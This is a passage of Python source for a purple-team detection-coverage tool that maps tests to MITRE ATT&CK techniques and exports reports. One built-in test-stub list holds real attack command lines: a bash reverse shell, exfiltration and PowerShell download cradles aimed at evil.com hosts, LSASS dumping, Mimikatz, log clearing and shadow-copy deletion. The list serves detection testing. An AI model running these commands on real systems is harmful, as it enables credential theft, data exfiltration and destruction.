            },
            "hideDisabled": False,
            "techniques": techniques,
            "gradient": {
                "colors": ["#ef4444", "#f59e0b", "#10b981"],
                "minValue": 0,
                "maxValue": 100,
            },
            "legendItems": [
                {"label": "Full Coverage", "color": "#10b981"},
                {"label": "Partial Coverage", "color": "#f59e0b"},
                {"label": "No Coverage", "color": "#ef4444"},
                {"label": "Untested", "color": "#374151"},
            ],
            "metadata": [{
                "name": "generator",
                "value": "ThreatScope — atomic_verifier.py",
            }],
            "showTacticRowBackground": True,
            "tacticRowBackground": "#1a2332",
            "selectTechniquesAcrossTactics": False,
        }

    def export_csv(self) -> str:
        """
        Export coverage matrix as CSV text.

        Returns:
            CSV string with technique_id, status, confidence, sources.
        """
        lines = ["technique_id,status,confidence,test_count,detected_count,sources"]
        for tid in sorted(self.coverage.keys()):
            info = self.coverage[tid]
            sources = "; ".join(info.get("sources", [])[:5])
            lines.append(
                f"{tid},{info.get('status', 'untested')},"
                f"{info.get('confidence', 0):.2f},"
                f"{info.get('test_count', 0)},"
                f"{info.get('detected_count', 0)},"
                f'"{sources}"'
            )
        return "\n".join(lines)

    def get_summary(self) -> Dict[str, Any]:
        """Get overall coverage statistics."""
        total = len(self.coverage)
        full = sum(1 for v in self.coverage.values() if v.get("status") == "full")
        partial = sum(1 for v in self.coverage.values() if v.get("status") == "partial")
        none_ = sum(1 for v in self.coverage.values() if v.get("status") == "none")
        untested = sum(1 for v in self.coverage.values() if v.get("status") == "untested")

        return {
            "total_techniques": total,
            "full_coverage": full,
            "partial_coverage": partial,
            "no_coverage": none_,
            "untested": untested,
            "overall_score": round(
                (full + partial * 0.5) / max(total, 1) * 100, 1
            ),
            "tactic_scores": self.get_tactic_scores(),
        }


# ============================================================
# MITRE Verifier (High-Level Orchestrator)
# ============================================================

class MITREVerifier:
    """
    High-level orchestrator that combines AtomicTestRunner and
    CoverageMatrix to provide a complete purple team verification
    workflow.

    Example:
        >>> verifier = MITREVerifier()
        >>> verifier.load_atomics("atomic-red-team/atomics/")
        >>> report = verifier.run_full_assessment(sigma_engine=engine)
        >>> verifier.export_report("coverage_report.json")
    """

    def __init__(self) -> None:
        """Initialize the MITRE Verifier."""
        self.runner = AtomicTestRunner()
        self.matrix = CoverageMatrix()
        self._assessment_results: Optional[Dict[str, Any]] = None

    def load_atomics(self, path: str) -> int:
        """
        Load Atomic Red Team test definitions.

        Args:
            path: Path to the atomics directory.

        Returns:
            Number of tests loaded.
        """
        return self.runner.load_atomics_dir(path)

    def load_custom_tests(self, tests: List[Dict[str, Any]]) -> int:
        """
        Load custom purple team test definitions.

        Args:
            tests: List of test definition dicts.

        Returns:
            Number loaded.
        """
        return self.runner.load_custom_tests(tests)

    def run_full_assessment(
        self,
        sigma_engine=None,
        analyzer_cls=None,
        include_builtin_tests: bool = True,
    ) -> Dict[str, Any]:
        """
        Run a complete detection coverage assessment.

        Evaluates all loaded tests against Sigma rules and built-in
        patterns, builds coverage matrix, and generates gap analysis.

        Args:
            sigma_engine: Optional SigmaEngine instance.
            analyzer_cls: Optional ThreatAnalyzer class.
            include_builtin_tests: If True and no tests loaded, use
                                   built-in test stubs for common techniques.

        Returns:
            Full assessment report dictionary.
        """
        # Load built-in test stubs if no external tests available
        if include_builtin_tests and not self.runner.tests:
            self._load_builtin_test_stubs()

        # Clear previous results
        self.runner.clear_results()

        # Run evaluations
        results = self.runner.evaluate_combined(
            sigma_engine=sigma_engine,
            analyzer_cls=analyzer_cls,
        )

        # Build coverage matrix
        self.matrix = CoverageMatrix()
        self.matrix.ingest_results(results)

        if sigma_engine:
            self.matrix.ingest_sigma_coverage(sigma_engine)

        # Compile full assessment
        self._assessment_results = {
            "metadata": {
                "tool": "ThreatScope MITRE Verifier",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "total_tests_loaded": len(self.runner.tests),
                "unique_techniques": len(self.runner.tests_by_technique),
            },
            "test_results": [r.to_dict() for r in results],
            "runner_summary": self.runner.get_summary(),
            "coverage_matrix": self.matrix.get_summary(),
            "navigator_layer": self.matrix.export_navigator_layer(),
            "gap_report": self.runner.get_gap_report(),
        }

        logger.info(
            f"Assessment complete: {self.matrix.get_summary()['overall_score']:.1f}% "
            f"coverage across {len(self.matrix.coverage)} techniques"
        )

        return self._assessment_results

    def _load_builtin_test_stubs(self) -> None:
        """Load built-in test stubs for common MITRE techniques."""
        builtin_tests = [
            # Execution
            {
                "technique_id": "T1059.001",
                "test_name": "PowerShell Execution — Encoded Command",
                "command": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
                "executor": "powershell",
                "severity": "high",
                "data_sources": ["process_creation", "command_line"],
            },
            {
                "technique_id": "T1059.003",
                "test_name": "Windows Command Shell — cmd.exe /c",
                "command": "cmd.exe /c whoami /all && net user && net localgroup administrators",
                "executor": "cmd",
                "severity": "medium",
                "data_sources": ["process_creation", "command_line"],
            },
            {
                "technique_id": "T1059.004",
                "test_name": "Unix Shell — Reverse Shell",
                "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "executor": "bash",
                "severity": "critical",
                "data_sources": ["process_creation", "network_connection"],
            },
            # Credential Access
            {
                "technique_id": "T1003.001",
                "test_name": "LSASS Memory Dump — Procdump",
                "command": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "file_creation"],
            },
            {
                "technique_id": "T1003",
                "test_name": "Credential Dumping — Mimikatz sekurlsa",
                "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line"],
            },
            {
                "technique_id": "T1110.001",
                "test_name": "Brute Force — Password Guessing",
                "command": "net use \\\\target\\IPC$ /user:admin password123",
                "executor": "cmd",
                "severity": "high",
                "data_sources": ["authentication", "network_connection"],
            },
            # Persistence
            {
                "technique_id": "T1547.001",
                "test_name": "Registry Run Key Persistence",
                "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\malware.exe",
                "executor": "cmd",
                "severity": "high",
                "data_sources": ["registry_modification", "command_line"],
            },
            {
                "technique_id": "T1053.005",
                "test_name": "Scheduled Task Persistence",
                "command": "schtasks /create /tn \"Updater\" /tr C:\\malware.exe /sc onlogon /ru System",
                "executor": "cmd",
                "severity": "high",
                "data_sources": ["scheduled_task", "process_creation"],
            },
            # Privilege Escalation
            {
                "technique_id": "T1068",
                "test_name": "Privilege Escalation — JuicyPotato",
                "command": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line"],
            },
            # Defense Evasion
            {
                "technique_id": "T1070.001",
                "test_name": "Log Clearing — wevtutil",
                "command": "wevtutil cl Security && wevtutil cl System && wevtutil cl Application",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line"],
            },
            {
                "technique_id": "T1562.001",
                "test_name": "Disable Windows Defender",
                "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
                "executor": "powershell",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line", "registry_modification"],
            },
            # Lateral Movement
            {
                "technique_id": "T1021.002",
                "test_name": "Lateral Movement — PsExec",
                "command": "psexec.exe \\\\target -u admin -p pass cmd.exe",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "network_connection", "authentication"],
            },
            # Discovery
            {
                "technique_id": "T1082",
                "test_name": "System Information Discovery",
                "command": "systeminfo && hostname && whoami /all",
                "executor": "cmd",
                "severity": "low",
                "data_sources": ["process_creation", "command_line"],
            },
            {
                "technique_id": "T1087",
                "test_name": "Account Discovery — Net User",
                "command": "net user /domain && net group \"Domain Admins\" /domain",
                "executor": "cmd",
                "severity": "medium",
                "data_sources": ["process_creation", "command_line"],
            },
            # Exfiltration
            {
                "technique_id": "T1041",
                "test_name": "Exfiltration Over C2 Channel",
                "command": "curl -X POST -d @sensitive_data.zip https://exfil.evil.com/upload",
                "executor": "bash",
                "severity": "critical",
                "data_sources": ["network_connection", "process_creation"],
            },
            # C2
            {
                "technique_id": "T1071.001",
                "test_name": "Web C2 — Cobalt Strike Beacon",
                "command": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com/beacon')",
                "executor": "powershell",
                "severity": "critical",
                "data_sources": ["network_connection", "process_creation", "dns_query"],
            },
            # Impact
            {
                "technique_id": "T1486",
                "test_name": "Ransomware — Volume Shadow Copy Delete",
                "command": "vssadmin delete shadows /all /quiet && bcdedit /set {default} recoveryenabled No",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line"],
            },
            {
                "technique_id": "T1490",
                "test_name": "Inhibit System Recovery",
                "command": "wbadmin delete catalog -quiet && bcdedit /set {default} bootstatuspolicy ignoreallfailures",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line"],
            },
            # Collection
            {
                "technique_id": "T1560.001",
                "test_name": "Archive Collected Data — 7zip",
                "command": "7z a -ppassword123 C:\\exfil\\data.7z C:\\Users\\*\\Documents\\*.docx",
                "executor": "cmd",
                "severity": "high",
                "data_sources": ["process_creation", "file_creation"],
            },
            # Initial Access
            {
                "technique_id": "T1566.001",
                "test_name": "Phishing — Macro-Enabled Document",
                "command": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass\"\"\")",
                "executor": "cmd",
                "severity": "critical",
                "data_sources": ["process_creation", "command_line"],
            },
        ]

        loaded = self.runner.load_custom_tests(builtin_tests)
        logger.info(f"Loaded {loaded} built-in purple team test stubs")

    def export_report(self, filepath: str, fmt: str = "json") -> bool:
        """
        Export assessment report to file.

        Args:
            filepath: Output file path.
            fmt: Format ('json', 'csv', 'navigator').

        Returns:
            True if exported successfully.
        """
        if not self._assessment_results:
            logger.error("No assessment results — run run_full_assessment() first")
            return False

        try:
            outpath = Path(filepath)
            outpath.parent.mkdir(parents=True, exist_ok=True)

            if fmt == "json":
                with open(outpath, "w", encoding="utf-8") as fh:
                    json.dump(self._assessment_results, fh, indent=2, default=str)

            elif fmt == "csv":
                csv_content = self.matrix.export_csv()
                with open(outpath, "w", encoding="utf-8") as fh:
                    fh.write(csv_content)

            elif fmt == "navigator":
                layer = self.matrix.export_navigator_layer()
                with open(outpath, "w", encoding="utf-8") as fh:
                    json.dump(layer, fh, indent=2)

            else:
                logger.error(f"Unsupported export format: {fmt}")
                return False

            logger.info(f"Report exported to {outpath} ({fmt})")
            return True

        except Exception as e:
            logger.error(f"Failed to export report: {e}")
            return False

    def get_results(self) -> Optional[Dict[str, Any]]:
        """Get the latest assessment results."""
        return self._assessment_results
